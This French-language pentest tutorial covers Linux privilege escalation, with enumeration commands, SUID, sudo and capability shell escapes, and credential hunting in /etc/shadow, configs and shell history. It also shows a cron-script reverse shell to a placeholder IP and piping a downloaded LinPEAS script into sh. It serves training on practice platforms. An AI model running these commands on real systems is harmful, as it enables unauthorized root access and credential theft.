# Élévation de privilèges Linux : techniques et méthodes

Obtenir un shell sur un système n'est que la première étape. L'élévation de privilèges (privilege escalation ou privesc) consiste à passer d'un utilisateur standard à root. C'est une compétence fondamentale en pentest.

## Méthodologie générale

La privesc Linux suit une méthodologie en plusieurs étapes :

```
1. Reconnaissance (enumération)
2. Identifier les vecteurs potentiels
3. Vérifier et exploiter
4. Documenter
```

**Règle d'or** : l'énumération est 80% du travail. Plus vous collectez d'informations, plus vous trouvez de vecteurs.

## Énumération manuelle

### Informations système
```bash
# Version du système
uname -a
cat /etc/os-release
cat /proc/version

# Utilisateur courant
id
whoami
groups

# Utilisateurs du système
cat /etc/passwd
cat /etc/shadow  # Si lisible = jackpot
who             # Utilisateurs connectés
```

### Processus et services
```bash
# Processus en cours
ps aux
ps aux | grep root  # Processus root

# Services
systemctl list-units --type=service
netstat -tlnp
ss -tlnp

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

### Fichiers et permissions
```bash
# Fichiers SUID (s'exécutent avec les droits du propriétaire)
find / -perm -4000 -type f 2>/dev/null

# Fichiers SGID
find / -perm -2000 -type f 2>/dev/null

# Fichiers world-writable
find / -perm -o+w -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Fichiers appartenant à root mais éditables
find / -user root -writable 2>/dev/null | grep -v /proc
```

### Sudo
```bash
# Voir les droits sudo
sudo -l

# Exemple de sortie intéressante
(root) NOPASSWD: /usr/bin/python3
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/find
```

## Vecteurs courants

### 1. SUID binaires

Les binaires avec le bit SUID s'exécutent avec les droits du propriétaire (souvent root).

**Référence incontournable** : [GTFOBins](https://gtfobins.github.io/) — liste tous les binaires exploitables.

```bash
# Trouver les SUID
find / -perm -4000 -type f 2>/dev/null

# Exemples d'exploitation

# /usr/bin/find avec SUID
find . -exec /bin/bash -p \; -quit

# /usr/bin/python3 avec SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# /usr/bin/vim avec SUID
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# /usr/bin/cp avec SUID — copier /etc/shadow
cp /etc/shadow /tmp/shadow_copy
```

### 2. Sudo mal configuré

GTFOBins est aussi votre référence pour sudo.

```bash
# Si sudo python3 autorisé
sudo python3 -c 'import os; os.system("/bin/bash")'

# Si sudo vim autorisé
sudo vim -c ':!bash'

# Si sudo find autorisé
sudo find / -name "*.txt" -exec /bin/bash \;

# Si sudo less autorisé
sudo less /etc/hosts
# Dans less : !bash

# Si sudo awk autorisé
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 3. Cron jobs vulnérables

```bash
# Script cron world-writable
cat /etc/crontab
# */5 * * * * root /opt/backup.sh

# Si /opt/backup.sh est writable
echo 'bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1' >> /opt/backup.sh
# Attendre l'exécution du cron
```

### 4. Mots de passe dans les fichiers

```bash
# Chercher des mots de passe en clair
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /home/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.php" -exec grep -l "db_pass" {} \; 2>/dev/null

# Historique de commandes
cat ~/.bash_history
cat ~/.zsh_history
```

### 5. Services vulnérables en local

```bash
# Ports ouverts uniquement en local
netstat -tlnp | grep 127.0.0.1
ss -tlnp | grep 127.0.0.1

# Tunneler un service local avec SSH
ssh -L 8080:127.0.0.1:8080 user@target
```

### 6. Capabilities

```bash
# Lister les capabilities
getcap -r / 2>/dev/null

# python3 avec cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl avec cap_setuid
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

### 7. Kernel exploits

En dernier recours si aucun autre vecteur n'est trouvé.

```bash
# Version du kernel
uname -r

# Chercher des exploits kernel
searchsploit linux kernel 5.4
# ou rechercher sur exploit-db.com

# Exemples d'exploits kernel connus
# DirtyPipe (CVE-2022-0847) - kernel 5.8 à 5.16.11
# DirtyCow (CVE-2016-5195) - kernels anciens
```

## Outils automatisés

### LinPEAS — Le plus complet
```bash
# Télécharger et exécuter
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Sur la machine cible (sans internet)
# Uploader linpeas.sh puis
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### Linux Smart Enumeration (lse.sh)
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1   # Niveau 1 (basique)
./lse.sh -l 2   # Niveau 2 (plus complet)
```

## Exemple de workflow complet

```bash
# 1. Infos de base
id; uname -a; cat /etc/os-release

# 2. SUID rapide
find / -perm -4000 -type f 2>/dev/null

# 3. Sudo
sudo -l

# 4. Crons
cat /etc/crontab; ls /etc/cron.*/*

# 5. Capabilities
getcap -r / 2>/dev/null

# 6. Mots de passe
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# 7. Lancer LinPEAS pour une analyse complète
./linpeas.sh
```

## Conclusion

La privesc Linux repose sur une énumération méthodique et la connaissance des vecteurs courants. GTFOBins et LinPEAS sont vos meilleurs alliés. La pratique sur des machines HackTheBox et TryHackMe est indispensable pour développer les bons réflexes — chaque machine apporte de nouveaux vecteurs à connaître.
